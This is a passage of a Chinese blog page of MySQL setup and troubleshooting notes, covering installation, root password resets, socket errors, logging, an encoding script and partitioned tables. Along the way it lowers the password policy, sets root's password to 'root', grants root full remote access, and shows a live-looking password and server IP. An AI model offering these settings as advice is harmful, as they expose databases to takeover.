class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//dev.mysql.com/get/mysql57-community-release-el7-8.noarch.rpm</span></span><br><span class="line">yum localinstall mysql57-community-release-el7<span class="number">-8.</span>noarch.rpm</span><br><span class="line">yum repolist enabled | grep <span class="string">"mysql.*-community.*"</span></span><br><span class="line">mysql&gt; system yum repolist enabled | grep <span class="string">"mysql.*-community.*"</span></span><br><span class="line">Repository epel is listed more than once <span class="keyword">in</span> the configuration</span><br><span class="line">mysql-connectors-community/x86_64 MySQL Connectors Community                  <span class="number">74</span></span><br><span class="line">mysql-tools-community/x86_64      MySQL Tools Community                       <span class="number">74</span></span><br><span class="line">mysql57-community/x86_64          MySQL <span class="number">5.7</span> Community Server                 <span class="number">307</span></span><br><span class="line"> [root@VM_0_14_centos ~]# yum install mysql-community-server</span><br><span class="line"> grep <span class="string">'temporary password'</span> /<span class="keyword">var</span>/log/mysqld.log</span><br><span class="line"> Loaded plugins: fastestmirror, langpacks</span><br><span class="line"> Repository epel is listed more than once <span class="keyword">in</span> the configuration</span><br><span class="line"> Determining fastest mirrors</span><br><span class="line">  * nux-dextop: li.nux.ro</span><br><span class="line">  * webtatic: us-east.repo.webtatic.com</span><br><span class="line"> Package mysql-community-server<span class="number">-5.7</span><span class="number">.24</span><span class="number">-1.</span>el7.x86_64 already installed and latest version</span><br><span class="line"> Nothing to <span class="keyword">do</span></span><br><span class="line">     [root@VM_0_14_centos ~]# grep 'temporary password' /var/log/mysqld.log</span><br><span class="line">     [root@VM_0_14_centos ~]#</span><br><span class="line">     [root@VM_0_14_centos ~]# service mysqld restart</span><br><span class="line">     Redirecting to /bin/systemctl restart  mysqld.service</span><br><span class="line">     </span><br><span class="line">     [root@VM_0_14_centos ~]# /bin/systemctl restart  mysqld.service</span><br><span class="line">     [root@VM_0_14_centos ~]# ps aux|grep mysql</span><br><span class="line">     systemd+   <span class="number">765</span>  <span class="number">0.0</span>  <span class="number">0.2</span> <span class="number">1121296</span> <span class="number">4316</span> ?        Ssl   <span class="number">2018</span>  <span class="number">38</span>:<span class="number">00</span> mysqld</span><br><span class="line">     mysql    <span class="number">11499</span>  <span class="number">0.3</span>  <span class="number">8.8</span> <span class="number">1119512</span> <span class="number">166152</span> ?      Sl   <span class="number">17</span>:<span class="number">47</span>   <span class="number">0</span>:<span class="number">00</span> /usr/sbin/mysqld --daemonize --pid-file=<span class="regexp">/var/</span>run/mysqld/mysqld.pid</span><br><span class="line">     root     <span class="number">11769</span>  <span class="number">0.0</span>  <span class="number">0.0</span> <span class="number">112708</span>   <span class="number">964</span> pts/<span class="number">3</span>    R+   <span class="number">17</span>:<span class="number">49</span>   <span class="number">0</span>:<span class="number">00</span> grep --color=auto mysql</span><br><span class="line">     [root@VM_0_14_centos ~]# which mysqld</span><br><span class="line">     /usr/sbin/mysqld</span><br><span class="line">     [root@VM_0_14_centos ~]# lsof -i:3306</span><br><span class="line">     COMMAND   PID  USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">     mysqld  <span class="number">11499</span> mysql   <span class="number">18</span>u  IPv6 <span class="number">60264974</span>      <span class="number">0</span>t0  TCP *:mysql (LISTEN)</span><br><span class="line">     [root@VM_0_14_centos ~]# grep 'password' /var/log/mysqld.log</span><br><span class="line">     <span class="number">2019</span><span class="number">-01</span><span class="number">-14</span>T09:<span class="number">46</span>:<span class="number">16.712229</span>Z <span class="number">1</span> [Note] A temporary password is generated <span class="keyword">for</span> root@localhost: RpvpdgHKZ5;*</span><br><span class="line">     <span class="number">2019</span><span class="number">-01</span><span class="number">-14</span>T09:<span class="number">47</span>:<span class="number">39.920810</span>Z <span class="number">0</span> [Note] Shutting down plugin <span class="string">'validate_password'</span></span><br><span class="line">     <span class="number">2019</span><span class="number">-01</span><span class="number">-14</span>T09:<span class="number">47</span>:<span class="number">41.646659</span>Z <span class="number">0</span> [Note] Shutting down plugin <span class="string">'sha256_password'</span></span><br><span class="line">     <span class="number">2019</span><span class="number">-01</span><span class="number">-14</span>T09:<span class="number">47</span>:<span class="number">41.646662</span>Z <span class="number">0</span> [Note] Shutting down plugin <span class="string">'mysql_native_password'</span></span><br><span class="line">     [root@VM_0_14_centos ~]# mysql -uroot -p</span><br><span class="line">     Enter password:</span><br><span class="line">     Welcome to the MySQL monitor.  Commands end <span class="keyword">with</span> ; or \g.</span><br><span class="line">     Your MySQL connection id is <span class="number">2</span></span><br><span class="line">     Server version: <span class="number">5.7</span><span class="number">.24</span></span><br><span class="line">mysql&gt; use mysql</span><br><span class="line">ERROR <span class="number">1820</span> (HY000): You must reset your password using ALTER USER statement before executing <span class="keyword">this</span> statement.</span><br><span class="line">mysql&gt;  ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'*SUsheng*'</span>;</span><br><span class="line">ERROR <span class="number">1819</span> (HY000): Your password does not satisfy the current policy requirements</span><br><span class="line">mysql&gt;  ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'*SUsheng123*'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">'root'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'YourPassword9#'</span> WITH GRANT OPTION;</span><br><span class="line">修改/etc/my.cnf配置文件，在[mysqld]下添加编码配置</span><br><span class="line">vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">character_set_server=utf8</span><br><span class="line">init_connect=<span class="string">'SET NAMES utf8'</span></span><br><span class="line">λ mysql -h <span class="number">118.24</span><span class="number">.158</span><span class="number">.116</span> -uroot -p</span><br><span class="line">Enter password: ***********</span><br><span class="line">Welcome to the MySQL monitor.  Commands end <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is <span class="number">3</span></span><br><span class="line">Server version: <span class="number">5.7</span><span class="number">.24</span> MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">mysql5<span class="number">.7</span> 以后的争强了安全机制,所以使用yum安装,启动会系统会自动生成一个随机的密码，并且不能设置简单密码。所以需要修改 mysql 全局参数</span><br><span class="line"></span><br><span class="line">先用日志密码登录 mysql </span><br><span class="line"></span><br><span class="line">grep <span class="string">'temporary password'</span> /<span class="keyword">var</span>/log/mysqld.log</span><br><span class="line"></span><br><span class="line">会输出结果: A temporary password is generated <span class="keyword">for</span> root@localhost: ******</span><br><span class="line"></span><br><span class="line">使用此密码登录后 执行 SHOW VARIABLES LIKE <span class="string">'validate_password%‘;  查看 mysql 密码策略</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+--------------------------------------+--------+</span></span><br><span class="line"><span class="string">| Variable_name                        | Value  |</span></span><br><span class="line"><span class="string">+--------------------------------------+--------+</span></span><br><span class="line"><span class="string">| validate_password_check_user_name    | OFF    | </span></span><br><span class="line"><span class="string">| validate_password_dictionary_file    |        |</span></span><br><span class="line"><span class="string">| validate_password_length             | 8      |</span></span><br><span class="line"><span class="string">| validate_password_mixed_case_count   | 1      |</span></span><br><span class="line"><span class="string">| validate_password_number_count       | 1      |</span></span><br><span class="line"><span class="string">| validate_password_policy             | MEDIUM | </span></span><br><span class="line"><span class="string">| validate_password_special_char_count | 1      |</span></span><br><span class="line"><span class="string">+--------------------------------------+--------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">执行 set global validate_password_policy=LOW;  修改密码策略</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">执行 set global validate_password_length=6; 修改验证密码长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">切换 user 库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">update user set authentication_string = password('</span>root<span class="string">'), password_expired = '</span>N<span class="string">', password_last_changed = now() where user = '</span>root<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重启 mysqld 服务，再用新密码登录即可</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果无法登录,提示Access denied for user '</span>root<span class="string">'@'</span>localhost<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重新更新 root 用户的 plugin 字段</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">update user set plugin='</span>mysql_native_password<span class="string">' where user = '</span>root<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">更新成功后.重新执行更新密码操作</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">刷新权限  flush privileges;</span></span><br></pre></td></tr></table></figure>
<h3 id="查看实时执行的SQL语句"><a href="#查看实时执行的SQL语句" class="headerlink" title="查看实时执行的SQL语句"></a>查看实时执行的SQL语句</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">"general_log%"</span>;</span><br><span class="line">如下general_log值为OFF说明没有开启：</span><br><span class="line"></span><br><span class="line">+------------------+----------------------------------+</span><br><span class="line">| Variable_name    | Value                            |</span><br><span class="line">+------------------+----------------------------------+</span><br><span class="line">| general_log      | OFF                              |</span><br><span class="line">| general_log_file | <span class="regexp">/var/</span>lib/mysql/galley-pc.log |</span><br><span class="line">+------------------+----------------------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; SET GLOBAL general_log = <span class="string">'ON'</span>;</span><br><span class="line">mysql&gt; SET GLOBAL general_log_file = <span class="string">'/var/log/mysql/general_log.log'</span>;</span><br><span class="line">永久有效需要配置my.cnf文件，加入下面两行：</span><br><span class="line"></span><br><span class="line">general_log = <span class="number">1</span></span><br><span class="line">general_log_file = <span class="regexp">/var/</span>log/mysql/general_sql.log</span><br><span class="line">$ tail -f /<span class="keyword">var</span>/lib/mysql/general_sql.log</span><br><span class="line">/usr/sbin/mysqld, <span class="attr">Version</span>: <span class="number">5.7</span><span class="number">.24</span> (MySQL Community Server (GPL)). started <span class="keyword">with</span>:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: <span class="regexp">/var/</span>lib/mysql/mysql.sock</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line"><span class="number">2019</span><span class="number">-01</span><span class="number">-15</span>T08:<span class="number">45</span>:<span class="number">47.794791</span>Z       <span class="number">137</span> Query     SHOW VARIABLES LIKE <span class="string">'general%'</span></span><br><span class="line"></span><br><span class="line">直接使用 /etc/mysql/debian.cnf 文件中 [client] 节提供的用户名和密码</span><br><span class="line">mysql -u*** -p</span><br><span class="line">切换到 mysql 数据库</span><br><span class="line">use mysql;</span><br><span class="line">更新密码</span><br><span class="line">update user set authentication_string = password(<span class="string">'root'</span>), password_expired = <span class="string">'N'</span>, password_last_changed = now() where user = <span class="string">'root'</span>;</span><br><span class="line">刷新权限 flush privileges;</span><br><span class="line">重启 mysqld 服务，再用新密码登录即可</span><br><span class="line">如果无法登录,提示 Access denied <span class="keyword">for</span> user <span class="string">'root'</span>@<span class="string">'localhost'</span></span><br><span class="line">重新更新 root 用户的 plugin 字段</span><br><span class="line">update user set plugin=<span class="string">'mysql_native_password'</span> where user = <span class="string">'root'</span>;</span><br><span class="line">更新成功后.重新执行更新密码操作</span><br></pre></td></tr></table></figure>
<h3 id="Can’t-connect-to-local-MySQL-server"><a href="#Can’t-connect-to-local-MySQL-server" class="headerlink" title="Can’t connect to local MySQL server"></a>Can’t connect to local MySQL server</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost app]# mysql</span><br><span class="line">ERROR <span class="number">2002</span> (HY000): Can<span class="string">'t connect to local MySQL server through socket '</span>/<span class="keyword">var</span>/lib/mysql/mysql.sock<span class="string">' (2)</span></span><br><span class="line"><span class="string">[root@localhost app]# mysql -uroot -p</span></span><br><span class="line"><span class="string">Enter password: </span></span><br><span class="line"><span class="string">ERROR 2002 (HY000): Can'</span>t connect to local MySQL server through socket <span class="string">'/var/lib/mysql/mysql.sock'</span> (<span class="number">2</span>)</span><br><span class="line">查询自己的 mysql.sock文件</span><br><span class="line"></span><br><span class="line">发现自己的路径在 </span><br><span class="line"></span><br><span class="line">[root@localhost data]# find / -name mysql.sock</span><br><span class="line">/tmp/mysql.sock</span><br><span class="line">则在 my.cnf 中添加指定 mysql.sock文件</span><br><span class="line"></span><br><span class="line">[root@localhost data]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">socket=<span class="regexp">/tmp/my</span>sql.sock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fack!! 重启mysql服务问题依旧存在</span><br><span class="line"></span><br><span class="line">于是添加软连接</span><br><span class="line"></span><br><span class="line">[root@localhost data]# mkdir -pv /var/lib/mysql</span><br><span class="line">mkdir: 已创建目录 “/<span class="keyword">var</span>/lib/mysql”</span><br><span class="line">[root@localhost data]# ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock</span><br><span class="line">[root@localhost data]# mysql</span><br><span class="line">Welcome to the MySQL monitor.  Commands end <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is <span class="number">1</span></span><br><span class="line">Server version: <span class="number">5.6</span><span class="number">.16</span> Source distribution</span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2011</span>, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark <span class="keyword">of</span> Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> help. Type <span class="string">'\c'</span> to clear the current input statement.</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Access-denied-for-user-‘root‘-’localhost’"><a href="#Access-denied-for-user-‘root‘-’localhost’" class="headerlink" title="Access denied for user ‘root‘@’localhost’"></a>Access denied for user ‘root‘@’localhost’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/mysqld stop //停止mysql服务的运行</span><br><span class="line"># mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp; //跳过受权表访问</span><br><span class="line"># mysql -u root mysql //登录mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在mysql5<span class="number">.7</span>以下的版本如下：</span><br><span class="line">mysql&gt; UPDATE user SET Password=PASSWORD(<span class="string">'newpassword'</span>) where USER=<span class="string">'root'</span> and host=<span class="string">'127.0.0.1'</span> or host=<span class="string">'localhost'</span>;<span class="comment">//把空的用户密码都修改成非空的密码就行了。</span></span><br><span class="line"></span><br><span class="line">在mysql5<span class="number">.7</span>版本如下：</span><br><span class="line"></span><br><span class="line">update mysql.user set authentication_string=password(<span class="string">'newpassword'</span>) where user=<span class="string">'root'</span> and host=<span class="string">'127.0.0.1'</span> or host=<span class="string">'localhost'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; quit # /etc/init.d/mysqld restart //离开并重启mysql</span><br><span class="line"># mysql -uroot -p</span><br><span class="line">Enter password: &lt;输入新设的密码newpassword&gt; </span><br><span class="line">Connection:             Localhost via UNIX socket</span><br><span class="line">Server characterset:    latin1</span><br><span class="line">Db     characterset:    latin1</span><br><span class="line">Client characterset:    utf8</span><br><span class="line">Conn.  characterset:    utf8</span><br><span class="line">UNIX socket:            /var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# ps aux|grep mysqld</span><br><span class="line">root     10913  0.0  0.0 106228  1396 ?        S    Jan19   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/data1/mysql --socket=/tmp/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedir=/usr --user=mysql</span><br><span class="line">mysql    11147 57.8  3.4 3502672 416152 ?      Sl   Jan19 1706:42 /usr/sbin/mysqld --basedir=/usr --datadir=/data1/mysql --plugin-dir=/usr/lib64/mysql/plugin --user=mysql --log-error=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/tmp/mysql.sock</span><br></pre></td></tr></table></figure>
<h3 id="Can’t-connect-to-MySQL-server-on-‘127-0-0-1’"><a href="#Can’t-connect-to-MySQL-server-on-‘127-0-0-1’" class="headerlink" title="Can’t connect to MySQL server on ‘127.0.0.1’"></a>Can’t connect to MySQL server on ‘127.0.0.1’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# mysql -uroot -p -h 127.0.0.1</span><br><span class="line">Enter password:</span><br><span class="line">ERROR <span class="number">2003</span> (HY000): Can<span class="string">'t connect to MySQL server on '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">' (111)</span></span><br><span class="line"><span class="string">[root@localhost ~]# grep bind /etc/my.cnf</span></span><br><span class="line"><span class="string">bind-address=172.16.7.27</span></span><br><span class="line"><span class="string">[root@localhost ~]# mysql -uroot -p -h 172.16.7.27</span></span><br><span class="line"><span class="string">Enter password:</span></span><br><span class="line"><span class="string">Welcome to the MySQL monitor.  Commands end with ; or \g.</span></span><br><span class="line"><span class="string">Your MySQL connection id is 3979750</span></span><br><span class="line"><span class="string">Server version: 5.7.11 MySQL Community Server (GPL)</span></span><br><span class="line"><span class="string">Connection:             172.16.7.27 via TCP/IP#和通过socket链接不同</span></span><br></pre></td></tr></table></figure>
<h3 id="转换编码"><a href="#转换编码" class="headerlink" title="转换编码"></a>转换编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DIR=$1 # 转换编码文件目录https://tonydeng.github.io/2015/11/27/batch-conversion-file-encoding/</span><br><span class="line">FT=$2  # 需要转换的文件类型（扩展名）</span><br><span class="line">SE=$3  # 原始编码</span><br><span class="line">DE=$4  # 目标编码</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">`find $DIR -type f -name "*.$FT"`</span>; <span class="keyword">do</span></span><br><span class="line">	echo <span class="string">"conversion $file encoding $SE to $DE"</span></span><br><span class="line">    iconv -f $SE -t $DE <span class="string">"$file"</span> &gt; <span class="string">"$file"</span>.tmp</span><br><span class="line">    mv -f <span class="string">"$file"</span>.tmp <span class="string">"$file"</span></span><br><span class="line">done</span><br><span class="line"><span class="comment">//./batch_conversion_encoding.sh ~/sdk1 java GBK UTF8</span></span><br></pre></td></tr></table></figure>
<h3 id="安装-MySQL8-0-13"><a href="#安装-MySQL8-0-13" class="headerlink" title="安装 MySQL8.0.13"></a>安装 MySQL8.0.13</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">wget -c <span class="string">'https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.13-1.el7.x86_64.rpm-bundle.tar'</span></span><br><span class="line">解压</span><br><span class="line">tar xvf mysql<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64.rpm-bundle.tar</span><br><span class="line">安装</span><br><span class="line">yum install mysql-community-libs<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64.rpm</span><br><span class="line">yum install mysql-community-libs-compat<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64.rpm</span><br><span class="line">yum install mysql-community-client<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64.rpm</span><br><span class="line">yum install mysql-community-server<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64.rpm</span><br><span class="line">设置数据库https:<span class="comment">//laravel-china.org/articles/22686</span></span><br><span class="line">初次安装没进去，在/etc/my.cnf 中添加 skip-grant-tables, 使用mysql -uroot 直接进入数据库，</span><br><span class="line">修改root账号密码：</span><br><span class="line">alter user <span class="string">'root'</span>@<span class="string">'localhost'</span> identified by <span class="string">'**'</span>;</span><br><span class="line">mysql <span class="number">8.0</span>以后默认加密方式跟<span class="number">5.7</span>不一样 ：</span><br><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'**'</span> PASSWORD EXPIRE NEVER; <span class="comment">//修改用户永不过期</span></span><br><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED WITH mysql_native_password BY <span class="string">'***'</span>;<span class="comment">//更新一下用户的密码加密方式，修改密码</span></span><br><span class="line">flush privileges; <span class="comment">//执行完刷新权限</span></span><br><span class="line"></span><br><span class="line">创建新用户</span><br><span class="line">CREATE USER smile@% IDENTIFIED BY <span class="string">'passowrd'</span>; <span class="comment">//# 创建账号密码</span></span><br><span class="line">GRANT ALL ON . TO smile@% WITH GRANT OPTION; <span class="comment">//授予远程登录权限（.远程访问所有数据）</span></span><br><span class="line">REVOKE all privileges ON databasename.tablename FROM <span class="string">'username'</span>@<span class="string">'host'</span>; <span class="comment">//删除某些数据权限</span></span><br><span class="line">flush privileges;<span class="comment">//刷新权限</span></span><br><span class="line"><span class="comment">//不常用的 --- 创建过期用户</span></span><br><span class="line">CREATE USER smile@% IDENTIFIED BY <span class="string">'***'</span> PASSWORD EXPIRE INTERVAL <span class="number">90</span> DAY;</span><br><span class="line"><span class="comment">//数据库搞定</span></span><br><span class="line">service mysqld start restart stop</span><br></pre></td></tr></table></figure>
<h3 id="查询指定数据库的所有表名称"><a href="#查询指定数据库的所有表名称" class="headerlink" title="查询指定数据库的所有表名称"></a>查询指定数据库的所有表名称</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USE information_schema;</span><br><span class="line"></span><br><span class="line">SELECT TABLE_NAME,table_rows FROM TABLES WHERE TABLE_SCHEMA = <span class="string">'数据库名字'</span> ORDER BY table_rows DESC;</span><br><span class="line">查询指定库的数据大小，索引大小</span><br><span class="line">SELECT CONCAT(ROUND(SUM(DATA_LENGTH/<span class="number">1024</span>/<span class="number">1024</span>),<span class="number">2</span>),<span class="string">'MB'</span>) AS total_data_size, CONCAT(ROUND(SUM(index_length)/(<span class="number">1024</span>*<span class="number">1024</span>), <span class="number">2</span>), <span class="string">' MB'</span>) AS total_index_size FROM TABLES  WHERE table_schema  =  <span class="string">'数据库名字'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="MySQL-分区表"><a href="#MySQL-分区表" class="headerlink" title="MySQL 分区表"></a>MySQL 分区表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/22947</span></span><br><span class="line">如果需要定时清理一张普通大表里的历史数据。</span><br><span class="line"></span><br><span class="line">可以使用一个或多个带 where 条件的 <span class="keyword">delete</span> 语句去删除（where条件是时间）。 如果表数据量较大，这对数据库的造成了很大压力。即使我们把这些旧数据删除了，但是底层的数据文件并没有变小。</span><br><span class="line"></span><br><span class="line">为什么没有变小？</span><br><span class="line">当删除数据 时，MYSQL 并不会立即回收表空间。被已删除数据的占据的存储空间，以及索引位会空在那里，等待新的数据来弥补这个空缺。</span><br><span class="line">强行回收： OPTIMIZE TABLE</span><br><span class="line">mysql&gt; SHOW PLUGINS \G;</span><br><span class="line"></span><br><span class="line">*************************** <span class="number">43.</span> row ***************************</span><br><span class="line">   Name: partition</span><br><span class="line"> Status: ACTIVE</span><br><span class="line">   Type: STORAGE ENGINE</span><br><span class="line">Library: NULL</span><br><span class="line">License: GPL</span><br><span class="line">CREATE TABLE hash_partition_test (</span><br><span class="line">    id INT,</span><br><span class="line">    pdate INT</span><br><span class="line">)</span><br><span class="line">PARTITION BY HASH(id)</span><br><span class="line">PARTITIONS <span class="number">4</span>;</span><br><span class="line">CREATE TABLE range_partition_test (</span><br><span class="line">    id INT,</span><br><span class="line">    pdate INT</span><br><span class="line">)</span><br><span class="line">PARTITION BY RANGE (pdate) (</span><br><span class="line">    PARTITION p1 VALUES LESS THAN ( <span class="number">201702</span> ),</span><br><span class="line">    PARTITION p2 VALUES LESS THAN ( <span class="number">201703</span> ),</span><br><span class="line">    PARTITION p3 VALUES LESS THAN ( <span class="number">201704</span> ),</span><br><span class="line">    PARTITION p4 VALUES LESS THAN (MAXVALUE)</span><br><span class="line">);</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> range_partition_test;</span><br><span class="line">+------+--------+</span><br><span class="line">| id   | pdate  |</span><br><span class="line">+------+--------+</span><br><span class="line">|    <span class="number">1</span> | <span class="number">201701</span> |</span><br><span class="line">|    <span class="number">2</span> | <span class="number">201702</span> |</span><br><span class="line">|    <span class="number">3</span> | <span class="number">201703</span> |</span><br><span class="line">|    <span class="number">4</span> | <span class="number">201704</span> |</span><br><span class="line">|    <span class="number">5</span> | <span class="number">201705</span> |</span><br><span class="line">+------+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; explain partitions select * <span class="keyword">from</span> range_partition_test where pdate between <span class="number">201702</span> and <span class="number">201703</span>;</span><br><span class="line">+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br><span class="line">| id | select_type | table                | partitions | type | possible_keys | key  | key_len 